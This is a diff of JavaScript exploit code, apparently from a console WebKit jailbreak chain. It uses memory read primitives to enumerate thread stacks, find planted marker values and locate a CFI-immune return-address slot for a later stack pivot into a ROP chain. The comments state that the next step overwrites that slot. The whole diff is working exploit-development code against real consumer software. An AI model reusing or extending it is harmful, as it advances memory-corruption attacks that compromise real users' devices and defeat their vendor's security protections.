@@ -240,79 +240,71 @@ async function prepare(p) {
     // crash; the pivot is wired once the locate is confirmed on device.
     if (typeof OFFSET_wk_bootstrap !== "undefined"
         && OFFSET_wk_bootstrap === "selfstack") {
-        // main-thread stack extent (the 0x200000 stack) from _thread_list.
-        let mainStack = null;
+        // Enumerate every thread stack -- we do not assume which thread runs
+        // our JS. (base, size) pairs from _thread_list.
+        const stacks = [];
         for (let t = p.read8(libKernelBase.add32(OFFSET_lk__thread_list));
              t.low || t.hi; t = p.read8(t.add32(0x38))) {
+            const sa = p.read8(t.add32(0xA8));
             const sz = p.read8(t.add32(0xB0));
-            if (sz.low === 0x200000 && sz.hi === 0) { mainStack = p.read8(t.add32(0xA8)); break; }
+            if ((sa.low || sa.hi) && sz.hi === 0 && sz.low >= 0x4000
+                && sz.low <= 0x400000)
+                stacks.push([sa, sz.low]);
         }
-        if (!mainStack) throw new Error("selfstack: main-thread (0x200000) stack not found");
-        jbmark("SELF-MAIN-STACK", "base=0x" + mainStack.toString() + "-size=0x200000");
+        jbmark("SELF-STACKS", "count=" + stacks.length + "-sizes="
+            + stacks.map(x => "0x" + x[1].toString(16)).join(","));
 
-        // Two int32 markers -> NaN-boxed JSValues 0xffff0000_MMMMMMMM on the stack.
-        const M0 = 0x13370001, M1 = 0x13370002;   // arg0, arg1 patterns
-        const TAG = 0xffff0000;
+        const M0 = 0x13370001, M1 = 0x13370002;
+        let comparatorAddr = null;
+        const hitsAll = [];
 
-        let located = null;
         const comparator = function (a, b) {
-            if (located) return 0;                 // only the first comparison scans
-            // Map the whole main stack. array_from_address repoints a
-            // Uint8Array's vector, so read through ITS indexing (a fresh typed
-            // view over .buffer would hit the original 1001-byte buffer, not
-            // the stack). Scan 8-aligned qwords for M0's boxed little-endian
-            // pattern 01 00 37 13 00 00 ff ff.
-            const view = array_from_address(mainStack, 0x200000);
-            const SIZE = 0x200000;
-            for (let o = 0; o + 8 <= SIZE; o += 8) {
-                if (view[o] !== 0x01 || view[o + 1] !== 0x00
-                    || view[o + 2] !== 0x37 || view[o + 3] !== 0x13
-                    || view[o + 4] !== 0x00 || view[o + 5] !== 0x00
-                    || view[o + 6] !== 0xff || view[o + 7] !== 0xff) continue;
-                const argSlot = mainStack.add32(o);          // arg0 (a)
-                const cf = argSlot.sub32(0x30);              // CallFrame
-                const callee = p.read8(cf.add32(0x18));
-                const retPC = p.read8(cf.add32(0x08));
-                const retRva = retPC.sub32(libSceNKWebKitBase);
-                const inWk = retRva.hi === 0 && (retRva.low >>> 0) < 0x3673d22
-                    && (retRva.low >>> 0) > 0x1000;
-                // verify: this frame's callee is our comparator, and arg1 == M1
-                const arg1 = p.read8(argSlot.add32(0x8));
-                const calleeMatch = callee.low === (comparatorAddr.low >>> 0)
-                    && callee.hi === (comparatorAddr.hi >>> 0);
-                if (inWk && (calleeMatch
-                    || (arg1.low === M1 && (arg1.hi >>> 0) === TAG))) {
-                    located = { cf, retPC, retSlot: cf.add32(0x08),
-                        cbSlot: cf.add32(0x10), calleeMatch,
-                        retRva: retRva.low >>> 0, at: o };
-                    break;
+            if (hitsAll.length) return 0;
+            for (const [base, size] of stacks) {
+                const view = array_from_address(base, size);
+                for (let o = 0; o + 8 <= size; o += 8) {
+                    // low dword of the marker, little-endian: 01 00 37 13
+                    if (view[o] !== 0x01 || view[o + 1] !== 0x00
+                        || view[o + 2] !== 0x37 || view[o + 3] !== 0x13) continue;
+                    const slot = base.add32(o);
+                    const full = p.read8(slot);            // how arg0 is boxed
+                    const retc = (o >= 0x30) ? p.read8(base.add32(o - 0x28)) : null;   // CallFrame+0x08
+                    const callee = (o >= 0x30) ? p.read8(base.add32(o - 0x18)) : null; // CallFrame+0x18
+                    hitsAll.push({ base, o, full, retc, callee });
+                    if (hitsAll.length >= 8) return 0;
                 }
             }
             return 0;
         };
-        const comparatorAddr = p.leakval(comparator);
+        comparatorAddr = p.leakval(comparator);
         nogc.push(comparator);
         jbmark("SELF-COMPARATOR", "cell=0x" + comparatorAddr.toString());
 
-        // A tiny array keeps the comparator in the interpreter (args spilled to
-        // the CallFrame slots, not kept in registers by an optimizing tier).
         const arr = [M0, M1];
         arr.sort(comparator);
 
-        if (!located)
-            throw new Error("selfstack: marker not found on the stack -- the "
-                + "comparator args were not in the CallFrame slots (JIT tiered "
-                + "it up?), or the JSValue boxing differs. Retry / adjust.");
-        jbmark("SELF-CALLFRAME", "cf=0x" + located.cf.toString()
-            + "-retSlot=0x" + located.retSlot.toString()
-            + "-returnPC=wk+0x" + located.retRva.toString(16)
-            + "-calleeVerified=" + located.calleeMatch
-            + "-foundAtStack+0x" + located.at.toString(16));
-        jbmark("SELF-LOCATE-OK", "the returnPC above is the CFI-immune ret slot; "
-            + "next step overwrites it with pop-rsp + chain entry");
-        throw new Error("selfstack locate step OK: comparator return address "
-            + "found and verified (returnPC=wk+0x" + located.retRva.toString(16)
-            + "). Next: overwrite it to pivot into the chain.");
+        jbmark("SELF-HITS", "count=" + hitsAll.length);
+        for (let n = 0; n < hitsAll.length; n++) {
+            const h = hitsAll[n];
+            const calleeMatch = h.callee && h.callee.low === (comparatorAddr.low >>> 0)
+                && h.callee.hi === (comparatorAddr.hi >>> 0);
+            const retRva = h.retc ? h.retc.sub32(libSceNKWebKitBase) : null;
+            const inWk = retRva && retRva.hi === 0 && (retRva.low >>> 0) < 0x3673d22
+                && (retRva.low >>> 0) > 0x1000;
+            jbmark("SELF-HIT", "#" + n + "-stack=0x" + h.base.toString()
+                + "-off=0x" + h.o.toString(16)
+                + "-arg0boxed=0x" + h.full.toString()
+                + "-returnPC=" + (h.retc ? "0x" + h.retc.toString() : "n/a")
+                + (inWk ? "(wk+0x" + (retRva.low >>> 0).toString(16) + ")" : "")
+                + "-calleeMatch=" + calleeMatch);
+        }
+        if (!hitsAll.length)
+            throw new Error("selfstack: marker 0x13370001 not present on ANY "
+                + "thread stack -- sort did not spill the comparator args to the "
+                + "CallFrame (JIT?), or the array is not int32-backed.");
+        throw new Error("selfstack diagnostic: " + hitsAll.length
+            + " marker hit(s) -- see SELF-HIT lines for the boxing and the "
+            + "candidate returnPC / callee match.");
     }
 
     // -----------------------------------------------------------------------
